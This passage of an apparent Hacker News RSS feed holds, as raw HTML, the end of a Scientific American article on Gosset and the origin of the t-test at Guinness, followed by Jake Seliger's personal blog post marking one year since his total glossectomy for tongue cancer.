sizes="(min-width: 2000px) 2000px, (min-resolution: 3dppx) 50vw, (min-resolution: 2dppx) 75vw, 100vw"></picture><figcaption><p>Shuyao Xiao</p></figcaption></figure><p data-block="sciam/paragraph">Amid the flurry of scientific energy, the team faced a persistent problem: interpreting its data in the face of small sample sizes. One challenge the brewers confronted involves hop flowers, <a href="https://www.scientificamerican.com/article/whats-brewing-in-a-beer-is-startling-complexity/">essential ingredients in Guinness</a> that impart a bitter flavor and act as a natural preservative. To assess the quality of hops, brewers measured the soft resin content in the plants. Let’s say they deemed 8 percent a good and typical value. Testing every flower in the crop wasn’t economically viable, however. So they did what any good scientist would do and tested <a href="https://www.scientificamerican.com/article/these-numbers-look-random-but-arent-mathematicians-prove/">random samples</a> of flowers.</p><p data-block="sciam/paragraph">Let’s inspect a made-up example. Suppose we measure soft resin content in nine samples and, because samples vary, observe a range of values from 4 percent to 10 percent, with an average of 6 percent—too low. Does that mean we should dump the crop? Uncertainty creeps in from two possible explanations for the low measurements. Either the crop really does contain unusually low soft resin content, or though the <i>samples</i> contain low levels, the full crop is actually fine. The whole point of taking random samples is to rely on them as faithful representatives of the full crop, but perhaps we were unlucky by choosing samples with uncharacteristically low levels. (We only tested nine, after all.) In other words, should we consider the low levels in our samples significantly different from 8 percent or mere natural variation?</p><p data-block="sciam/paragraph">This quandary is not unique to brewing. Rather, it pervades all scientific inquiry. Suppose that in a medical trial, both the treatment group and placebo group improve, but the treatment group fares a little better. Does that provide sufficient grounds to recommend the medication? What if I told you that both groups actually received two different placebos? Would you be tempted to conclude that the placebo in the group with better outcomes must have medicinal properties? Or could it be that when you track a group of people, some of them will just naturally improve, sometimes by a little and sometimes by a lot? Again, this boils down to a question of <a href="https://www.scientificamerican.com/article/the-significant-problem-of-p-values/">statistical significance</a>.</p><p data-block="sciam/paragraph">The theory underlying these perennial questions in the domain of small <a href="https://www.scientificamerican.com/article/the-secret-sauce-in-opinion-polling-can-also-be-a-source-of-spoilage/">sample sizes</a> hadn’t been developed until Guinness came on the scene—specifically, not until William Sealy Gosset, head experimental brewer at Guinness in the early 20th century, invented the <i>t</i>-test. The concept of statistical significance predated Gosset, but prior statisticians worked in the regime of large sample sizes. To appreciate why this distinction matters, we need to understand how one would determine statistical significance.</p><figure data-block="contentful/image"><picture><source media="(min-width: 750px)" srcset="https://static.scientificamerican.com/dam/m/5de9585bddf6dfd0/original/guinness_graphic2_desktop.png?w=1350 1350w, https://static.scientificamerican.com/dam/m/5de9585bddf6dfd0/original/guinness_graphic2_desktop.png?w=2000 2000w, https://static.scientificamerican.com/dam/m/5de9585bddf6dfd0/original/guinness_graphic2_desktop.png?w=900 900w" sizes="(min-width: 2000px) 2000px, (min-resolution: 3dppx) 50vw, (min-resolution: 2dppx) 75vw, 100vw"><source media="(min-width: 0px)" srcset="https://static.scientificamerican.com/dam/m/60924c3d6a79769f/original/guinness_graphic2_mobile.png?w=1000 1000w, https://static.scientificamerican.com/dam/m/60924c3d6a79769f/original/guinness_graphic2_mobile.png?w=1200 1200w, https://static.scientificamerican.com/dam/m/60924c3d6a79769f/original/guinness_graphic2_mobile.png?w=600 600w, https://static.scientificamerican.com/dam/m/60924c3d6a79769f/original/guinness_graphic2_mobile.png?w=750 750w" sizes="(min-resolution: 3dppx) 50vw, (min-resolution: 2dppx) 75vw, 100vw"><img alt="Chart shows that the flatter curve of the t distribution compared with the normal distribution indicates that the t distribution has a larger significant signal-to-noise ratio." decoding="async" loading="lazy" src="https://static.scientificamerican.com/dam/m/5de9585bddf6dfd0/original/guinness_graphic2_desktop.png?w=900" width="3753" height="2056" srcset="https://static.scientificamerican.com/dam/m/5de9585bddf6dfd0/original/guinness_graphic2_desktop.png?w=1000 1000w, https://static.scientificamerican.com/dam/m/5de9585bddf6dfd0/original/guinness_graphic2_desktop.png?w=1200 1200w, https://static.scientificamerican.com/dam/m/5de9585bddf6dfd0/original/guinness_graphic2_desktop.png?w=1350 1350w, https://static.scientificamerican.com/dam/m/5de9585bddf6dfd0/original/guinness_graphic2_desktop.png?w=2000 2000w, https://static.scientificamerican.com/dam/m/5de9585bddf6dfd0/original/guinness_graphic2_desktop.png?w=600 600w, https://static.scientificamerican.com/dam/m/5de9585bddf6dfd0/original/guinness_graphic2_desktop.png?w=750 750w, https://static.scientificamerican.com/dam/m/5de9585bddf6dfd0/original/guinness_graphic2_desktop.png?w=900 900w" sizes="(min-width: 2000px) 2000px, (min-resolution: 3dppx) 50vw, (min-resolution: 2dppx) 75vw, 100vw"></picture><figcaption><p>Shuyao Xiao</p></figcaption></figure><p data-block="sciam/paragraph">Remember, the hops samples in our scenario have an average soft resin content of 6 percent, and we want to know whether the average in the full crop actually differs from the desired 8 percent or if we just got unlucky with our sample. So we’ll ask the question: What is <a href="https://www.scientificamerican.com/article/why-the-sleeping-beauty-problem-is-keeping-mathematicians-awake/">the probability</a> that we would observe such an extreme value (6 percent) if the full crop was in fact typical (with an average of 8 percent)?Traditionally, if this probability, called a <i>P</i> value, lies below 0.05, then we deem the deviation statistically significant, although different applications call for different thresholds.</p><p data-block="sciam/paragraph">Often two separate factors affect the <i>P</i> value: how far a sample deviates from what is expected in a population and how common big deviations are. Think of this as a tug-of-war between signal and noise. The difference between our observed mean (6 percent) and our desired one (8 percent) provides the signal—the larger this difference, the more likely the crop really does have low soft resin content. The standard deviation among flowers brings the noise. Standard deviation measures how spread out the data are around the mean; small values indicate that the data hover near the mean, and larger values imply wider variation. If the soft resin content typically fluctuates widely across buds (in other words, has a high standard deviation), then maybe the 6 percent average in our sample shouldn’t concern us. But if flowers tend to exhibit consistency (or a low standard deviation), then 6 percent may indicate a true deviation from the desired 8 percent.</p><p data-block="sciam/paragraph">To determine a <i>P</i> value in an ideal world, we’d start by calculating the signal-to-noise ratio. The higher this ratio, the more confidence we have in the significance of our findings because a high ratio indicates that we’ve found a true deviation. But what counts as high signal-to-noise? To deem 6 percent significantly different from 8 percent, we specifically want to know when the signal-to-noise ratio is so high that it only has a 5 percent chance of occurring in a world where an 8 percent resin content is the norm. Statisticians in Gosset’s time knew that if you were to run an experiment many times, calculate the signal-to-noise ratio in each of those experiments and graph the results, that plot would resemble a “standard normal distribution”—<a href="https://statisticsbyjim.com/basics/normal-distribution/">the familiar bell curve</a>. Because the normal distribution is well understood and documented, you can look up in a table how large the ratio must be to reach the 5 percent threshold (or any other threshold).</p><p data-block="sciam/paragraph">Gosset recognized that this approach only worked with large sample sizes, whereas small samples of hops wouldn’t guarantee that normal distribution. So he meticulously tabulated new distributions for smaller sample sizes. Now known as <i>t</i>-distributions, these plots resemble the normal distribution in that they’re bell-shaped, but the curves of the bell don’t drop off as sharply. That translates to needing an even larger signal-to-noise ratio to conclude significance. His <i>t</i>-test allows us to make inferences in settings where we couldn’t before.</p><p data-block="sciam/paragraph">Mathematical consultant John D. Cook mused on <a href="https://www.johndcook.com/blog/2008/06/27/wine-beer-and-statistics/">his blog</a> in 2008 that perhaps it should not surprise us that the <i>t</i>-test originated at a brewery as opposed to, say, a winery. Brewers demand consistency in their product, whereas vintners revel in variety. Wines have “good years,” and each bottle tells a story, but you want every pour of Guinness to deliver the same trademark taste. In this case, uniformity inspired innovation.</p><p data-block="sciam/paragraph">Gosset solved many problems at the brewery with his new technique. The self-taught statistician <a href="https://www.jstor.org/stable/2331554?casa_token=1652dnOSNrEAAAAA%3AI4iWjKpCkwXkSrqiwVAsbsNLTbf6GInl0s3VM9sgZ1G-bYeUzEwaUHM3AzY0_m5SiIRrloH22n0dsDT7ShPAUie65cFhRoO-pWIXfzENzFG7HUKO7FE-&amp;seq=1#metadata_info_tab_contents">published his <i>t</i>-test</a> under the pseudonym “Student” because Guinness didn’t want to tip off competitors to its research. Although Gosset pioneered industrial quality control and contributed loads of other ideas to quantitative research, most textbooks still call his great achievement the “Student’s <i>t</i>-test.” History may have neglected his name, but he could be proud that the <i>t</i>-test is one of the most widely used statistical tools in science to this day. Perhaps his accomplishment belongs in <i>Guinness World Records </i>(the idea for which was dreamed up by Guinness’s managing director in the 1950s). Cheers to that.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The one-year anniversary of my total glossectomy (278 pts)]]></title>
            <link>https://jakeseliger.com/2024/05/25/the-one-year-anniversary-of-my-total-glossectomy/</link>
            <guid>40485246</guid>
            <pubDate>Sun, 26 May 2024 20:46:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jakeseliger.com/2024/05/25/the-one-year-anniversary-of-my-total-glossectomy/">https://jakeseliger.com/2024/05/25/the-one-year-anniversary-of-my-total-glossectomy/</a>, See on <a href="https://news.ycombinator.com/item?id=40485246">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
						
<p>One year ago today, I went into surgery expecting that I’d lose half my tongue to a squamous cell carcinoma recurrence. The evening before, Bess and I got legally married;<a href="#_ftn1" id="_ftnref1">[1]</a> it was a short, but charming, crash ceremony. I say “crash ceremony” because we wanted to marry before surgery, and on afternoon of May 24 I learned a spot had opened for the next day. It was only luck—if you could call any part of this story “lucky”—that Bess and I had picked up our marriage license a few days earlier, expecting to wed sometime before the planned surgery date of June 8 or 9. &nbsp;</p>



<p>The tumor itself has only been confirmed on May 11: I got a “hot” PET scan on April 26. Mayo Phoenix initially scheduled follow-up CT scans a few weeks later to figure out what was going on, but <a href="https://www.mayoclinic.org/biographies/hinni-michael-l-m-d/bio-20053549">Dr. Hinni</a>, the ENT surgeon at Mayo who saved my life, did not like that delay (he dislikes any delay, a trait which has likely saved my life on several occasions) and ordered them stat, so on May 1 I went in to find out whether I was likely to live or die.</p>



<p>The CT scans were ambiguous. On May 8, I went in for a fine-needle biopsy done by interventional radiology. The fine-needle biopsy was also ambiguous. On May 9, I went in for a core biopsy, which found no cancer. I celebrated and told friends and family I was in the clear. I don’t remember if it was that day or the next that Tony Mendez, Dr. Hinni’s PA, called to say they weren’t convinced by the biopsy, and that, if I was up for it, Dr. Hinni would do a surgical biopsy on May 11. Dr. Hinni didn’t trust the biopsy results and didn’t like the ambiguity in the scans. His favorite radiologist—he said something like “she doesn’t miss”—couldn’t tell whether the images showed cancer or something else.</p>



<p>Yeah, I was up for it. The surgical biopsy removed all ambiguity: cancer. But the soonest a hemi-glossectomy could be scheduled was June 8 or 9. Throughout May, my conditioned worsened: headaches that were noticeable at the beginning of the month required oxycodone by the middle. The month-long gap between May 11 and June 8 seemed cavernous. Bess and I lurched into action to try and figure out what to do, because the only Mayo head and neck oncologist, a guy named Panayiotis Savvides, happened to be on vacation in Greece. We couldn’t get ahold of him, and Mayo, peculiarly, had no backup coverage. What happens to people who get sick while the head and neck oncologist is out of town? Eventually his PA tracked him down and got a prescription for an immunotherapy called pembrolizumab (Keytruda) to start on May 19.</p>



<p>But was that enough? We didn’t know and couldn’t ask about the rationale. Bess did some drive-by consultation from docs she knew online, some of whom recommended we look into chemo. We were lucky enough to meet with an oncologist named <a href="https://doctors.bannerhealth.com/provider/Fade+Mahmoud/673131">Dr. Mahmoud</a> at Banner-MD Anderson on May 18 or 19. He had a sense of urgency appropriate to cancer: he said that he’d admit me through the emergency room to start chemo and Keytruda right away, to possibly slow the tumor. The surgeons at Banner didn’t think clean margins were possible given the extent of the tumor, without first shrinking it. But Dr. Hinni thought clean margins were attainable, and chemo would delay surgery by weeks, possibly months, because of its effects on wound healing. If chemo didn’t work, the window for a possible cure would be closed. Would Keytruda have any effects on surgery? Dr. Hinni said no. The question of chemo first versus chemo later became moot as my condition worsened rapidly.</p>



<p>I wound up getting a Keytruda infusion on Monday, May 22. In my calendar, there is a “post-operative visit” on that day as well, so I must’ve seen Tony and/or Dr. Hinni. I was doing terribly, and one or both of them must’ve seen my deteriorating condition and deduced the obvious. The next day was my brother and sister’s birthday, which has no immediate bearing on this story, except to say that cancer has a way of ruining all sorts of things for both the patient and the people who love them. On May 24, Tony called: would I be up for hemi-glossectomy (removing half the tongue) on May 25? Dr. Hinni was leaving for vacation either that night or the next day (I think the next day).</p>



<p>When Tony asked, I felt a bizarre lurch in consciousness. But I said yes. What other answer was there? It must have taken an epic feat of coordination to make the surgery happen, because it required not only a full day from Dr. Hinni and Tony and many others, but another ENT named Dr. Nagle, who would form a “flap” of muscle out of tissue from my leg, to replace the lost half of my tongue. Two surgeons would be working on me, one up top, as it were, and the second down below.</p>



<p>I texted Bess, who was at work, right away, then family, then friends. My brother and sister drove out from L.A. My mom flew. Bess accelerated a plan to get blood drawn before the surgery and sent to a company called <a href="https://www.natera.com/">Natera</a>; they make tests that monitor circulating tumor DNA (ctDNA). A Natera test can find cancer cells in the blood before a tumor is visible to imaging. We planned to monitor ctDNA to guide decisions around, for example, post-operative chemotherapy, which we’d planned to initiate in the hopes that it would kill off any microscopic errant tumor cells left behind.</p>



<p>May 24 turned into a complicated, hectic day. I don’t remember most of it. Whatever feelings I had, I stuffed down, because feelings are often not helpful in the face of difficult tasks that nonetheless must be completed. Picking up that marriage license a few days prior suddenly seemed fortuitous. In Arizona, it’s possible for anyone to become ordained to conduct marriages online, so Bess sent a text to our friend Smetana, asking if she’d like to do the honors, a role which she immediately and enthusiastically said yes to.<a href="#_ftn2" id="_ftnref2">[2]</a></p>



<p>The night of May 24, I got dinner from <a href="http://www.fnbrestaurant.com/">FnB</a>, a restaurant down the street and one that we call “New-York good”—most restaurants in Arizona are not great, and one that would be worth eating at even in New York is special. FnB was a good choice for a last meal, even though I didn’t know it was my last meal and was also too sick to fully enjoy it. After, Smetana and her boyfriend Cody came over for a wedding ceremony in the dark. We stood in the courtyard of our apartment building next to the pool, in a corner under some fairy lights the apartment directly above us had hung off their balcony. Smetana wrote the ceremony with the aid of ChatGPT, and Bess <a href="https://bessstillman.substack.com/p/forever-is-short-long-time">wore her emergency wedding dress</a>, which I think she’s had since she was a teenager. Make of that what you will.</p>



<p>It wasn’t what we’d planned. We admittedly planned nothing. Who can, in the face of a fast-moving, aggressive cancer that upends plans like Godzilla upends cities? But if we had, I had a feeling it wouldn’t be what happened. Cancer has a way of crashing the party. Thus, our “crash” wedding.</p>



<p>There wasn’t much of an immediate celebration. I fell asleep early: exhaustion, oxycodone, and a day full of tension will do that. I don’t know how much Bess slept, since she’s prone to insomnia when stressed. The next morning I got up early and saw, briefly, my brother and sister, who much later told me that I looked like shit, or a walking corpse, or both—I don’t think either had realized how bad I’d gotten. I’m not sure I realized how bad I’d gotten. Bess and I drove to Mayo and checked in. I don’t remember the exact sequence of events, except that there was, of course, some kind of problem with the lab order for the Natera blood sample and Bess had to last-minute wrangle the test for me (it had to be done pre-op or not at all) with the help of an oncologist named Kat Price at Mayo Rochester, and her own sweet-talking of the lab techs. What I mostly remember is the fear I kept in check, and Bess waiting in the pre-op area with me, but eventually Bess having to depart and anesthesiology putting me under.</p>



<p>The old me died on the table. The new me is still being born, and may not wholly be born.</p>



<p>When I woke up sufficiently to form memories that night, I knew quickly that something was wrong. I couldn’t think properly, but I had a sense that things were not well. Early on, someone—a nurse, I assume—told me not to turn my head. Someone—I think Bess, though I’m not sure—said that the hemi-glossectomy turned into a total glossectomy. The tumor had spread too far, too fast, and had taken out both major blood vessels in the tongue, so the whole tongue had to come out. However bad that night was, many worse days followed. In some ways, the horror of that period is still with me. By July 21, less than two months later, another <a href="https://jakeseliger.com/2023/07/22/i-am-dying-of-squamous-cell-carcinoma-and-the-treatments-that-might-save-me-are-just-out-of-reach/">six to eight tumors had grown</a>. If I’d known how things would shake out, I likely would’ve pivoted to chemo and <a href="https://bessstillman.substack.com/p/please-be-dying-but-not-too-quickly">clinical trials</a> the moment the surgical biopsy came back. But I didn’t and couldn’t.</p>



<p>I can’t believe it’s been a calendar year, and not, say, fifteen. I’ve lived a lot of darkness. I feel like I’m only now, after a whole year, reaching towards recovery from the surgery, the chemo, the clinical-trial drugs, although the trial drug I’m currently on <a href="https://jakeseliger.com/2024/05/09/the-recent-war-between-cancer-and-cancer-treatment-side-effects/">causes GI and nausea side effects</a>—and they appear to be worse for me than for most recipients. The exhaustion that comes with surgery is underrated and under-discussed. There are still moments when I forget what life is for me: the other day I looked at some of the first Rainer cherries of the summer, and wanted to buy them, then remembered I’d have to blend them, which defeats a lot of the point, and I almost cried in the grocery store.</p>



<p>The likelihood of me living to see another anniversary is low—probably under 20%—but not 0%. I know I’m supposed to feel joy and gratitude at still being corporeal, and sometimes I do, but often I don’t (though I am grateful to everyone who has helped me, and that includes <a href="https://www.gofundme.com/f/help-the-fight-against-cancer-with-jake-s">thousands of people</a>, ranging from strangers who donated $5 on Go Fund Me to oncologists who oversee clinical trials). Sadness dogs me. The struggles remain acute. I’m typing this at my desk, and in front of me is a cup on a bed of tissues in which I have to routinely spit. I don’t know exactly how many times a day I have to spit daily—dozens? more than a hundred?—but it’s a lot. And that’ll be how every day will be until the last. Yet I am working on finding meaningful, generative ways to live. Without those, what is there?</p>



<p><em>If you’ve gotten this far, </em><a href="https://www.gofundme.com/f/help-the-fight-against-cancer-with-jake-s"><em>consider the Go Fund Me</em></a><em> that’s funding ongoing care.</em></p>



<hr>



<p><a href="#_ftnref1" id="_ftn1">[1]</a> Send an email if you’re curious about the video.</p>



<p><a href="#_ftnref2" id="_ftn2">[2]</a> She’s a generally immediate and enthusiastic person.</p>



<figure><a href="https://jakeseliger.com/wp-content/uploads/2024/05/one-year-after-total-glossectomy.jpg"><img data-attachment-id="8585" data-permalink="https://jakeseliger.com/2024/05/25/the-one-year-anniversary-of-my-total-glossectomy/one-year-after-total-glossectomy/" data-orig-file="https://jakeseliger.com/wp-content/uploads/2024/05/one-year-after-total-glossectomy.jpg" data-orig-size="2048,1588" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="one-year-after-total-glossectomy" data-image-description="" data-image-caption="" data-medium-file="https://jakeseliger.com/wp-content/uploads/2024/05/one-year-after-total-glossectomy.jpg?w=300" data-large-file="https://jakeseliger.com/wp-content/uploads/2024/05/one-year-after-total-glossectomy.jpg?w=550" width="1024" height="794" src="https://jakeseliger.com/wp-content/uploads/2024/05/one-year-after-total-glossectomy.jpg?w=1024" alt=""></a></figure>
					</div></div>]]></description>
        </item>
    </channel>
</rss>